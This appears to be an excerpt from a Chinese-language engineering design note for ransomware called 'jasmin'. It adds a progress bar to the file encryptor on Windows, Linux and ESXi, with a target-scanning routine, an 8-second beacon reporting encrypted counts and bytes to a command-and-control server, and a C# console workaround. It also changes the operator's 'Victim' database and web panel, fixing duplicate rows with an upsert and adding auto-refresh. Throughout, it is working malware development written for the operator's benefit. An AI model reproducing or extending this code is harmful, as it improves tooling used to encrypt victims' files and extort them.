## 一、设计要点

### 1.1 分母从哪来：预扫描（内存 O(1)）

进度条必须知道总数，但**不能先把所有路径存进列表** —— 百万级文件会吃掉上百 MB，恰好重蹈 OOM 覆辙。

因此采用**两遍扫描**：第一遍只累加计数与字节数，不保存任何路径。

```python
def scan_targets(roots):
    n=0; total=0
    for r in roots:
        if not os.path.isdir(r): continue
        for dp,_,fs in os.walk(r):
            for f in fs:
                fp=os.path.join(dp,f)
                if skip(fp): continue
                try: sz=os.path.getsize(fp)
                except: continue
                n+=1; total+=sz
    return n,total
```

代价是元数据操作翻倍，但加密本身是 I/O + 密码学密集，占比很小。

ESXi 端同理，`find` 结果落临时清单文件后逐行计数（顺带规避子 shell 问题）。

### 1.2 终端自适应

- **TTY**：`sys.stderr.isatty()` 为真 → `\r` 原位刷新单行进度条，按 `os.get_terminal_size()` 截断避免折行错乱。
- **非 TTY**（重定向 / nohup / cron）：降级为每 50 个文件打印一行摘要，不刷屏也不丢日志。

实测非 TTY 输出：

```
[jasmin] 正在扫描目标文件...
[jasmin] 发现 15 个目标文件，合计 2.64MB
[jasmin] 100.0% (15/15) 2.64MB/2.64MB
[jasmin] 加密完成: 15/15 个文件, 2.64MB / 2.64MB
```

### 1.3 进度心跳 → 后台

每处理一个文件检查一次时间戳，距上次 ≥8 秒则回传一次进度：

```python
if now-last[0]>=8:
    last[0]=now
    beacon(sid,None,{'ok':st['ok'],'bytes':st['bytes'],
                     'total':total_files,'total_bytes':total_bytes})
```

心跳与完成回传用**同一个** `beacon()`，靠字段区分：

| 字段 | 进行中心跳 | 完成回传 |
|---|---|---|
| `is_complete` | `0` | `1` |
| `encrypted_count/size` | 当前已加密量 | 最终量 |
| `total_count/size` | 扫描分母 | 扫描分母 |
| `encrypted_types/detail` | 不传 | 传 |

### 1.4 Windows 的控制台难题

编译目标是 `/target:winexe`（GUI 子系统），**默认没有控制台**，`Console.Error.Write` 直接抛异常。解法是 P/Invoke `AttachConsole(-1)` 挂到父进程控制台；挂不上（双击运行）则静默跳过进度输出，只靠心跳让后台可视化。

```csharp
[DllImport("kernel32.dll")] static extern bool AttachConsole(int dwProcessId);
[DllImport("kernel32.dll")] static extern bool FreeConsole();
...
try{ P_CONSOLE=AttachConsole(-1); }catch{ P_CONSOLE=false; }
```

另：心跳计时不用 `DateTimeOffset.ToUnixTimeSeconds()`（需 .NET 4.6+），改 `DateTime.UtcNow.Ticks/TimeSpan.TicksPerSecond` 以兼容 4.0+。

## 二、后台改造

### 2.1 Schema 扩展

```sql
`total_count`  int(11)    NOT NULL DEFAULT 0  COMMENT '进度条分母：目标文件总数',
`total_size`   bigint(20) NOT NULL DEFAULT 0  COMMENT '进度条分母：目标总字节',
`is_complete`  tinyint(1) NOT NULL DEFAULT 1  COMMENT '0=加密进行中 1=已完成',
`updated_at`   timestamp  NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
```

**幂等迁移**：老库升级不能靠重建表。PHP 端用 `.schema_v3` 标记文件 + `information_schema` 探测，Python 端用 `db.inspect()`，两端都只在缺列时 `ALTER TABLE`。

### 2.2 进度百分比

```php
if ($ts > 0)      $pct = round($es * 100 / $ts);   // 优先按字节
elseif ($tc > 0)  $pct = round($ec * 100 / $tc);   // 退化按文件数
else              $pct = $ic ? 100 : 0;
```

### 2.3 关键修复：Python 端从 INSERT 改为 UPSERT

**这是引入进度心跳后暴露的严重问题**。Python 后端原先每次握手都 `db.session.add(v)` 新建一行 —— 加上每 8 秒一次的心跳，一台受害主机会在几分钟内灌出上百行重复记录，面板彻底不可用。

改为按 `systemid` 查找并更新：

```python
v = Victim.query.filter_by(systemid=systemid).first() if systemid else None
if v is None:
    v = Victim(systemid=systemid); db.session.add(v)
...
# 计数只增不减，避免心跳把已有统计清零
if ec > 0 or (v.encrypted_count or 0) == 0: v.encrypted_count = ec
```

实测：连发 2 次心跳 → 数据库仍只有 **1 行**。

### 2.4 自动刷新

`is_complete = 0` 的行触发页面每 10 秒 `location.reload()`，并在顶部挂一条提示横幅。判定查询走**全库**而非当前页（`SELECT COUNT(*) ... WHERE is_complete = 0`），避免进行中的主机被分页挡住时不刷新。

## 六、已知局限

1. **预扫描成本**：分母需要完整走一遍文件系统。超大文件系统（千万级 inode）上扫描阶段可能耗时数十秒，此期间进度条分母尚未显示。
2. **心跳丢失**：进度心跳是 fire-and-forget，网络中断时不重试；最终完成回传是独立请求，不受影响。
3. **多实例并发**：同一 `systemid` 被多台机器共用时会被 upsert 合并（`systemid` 由 `uid+hostname` 生成，正常情况下唯一）。
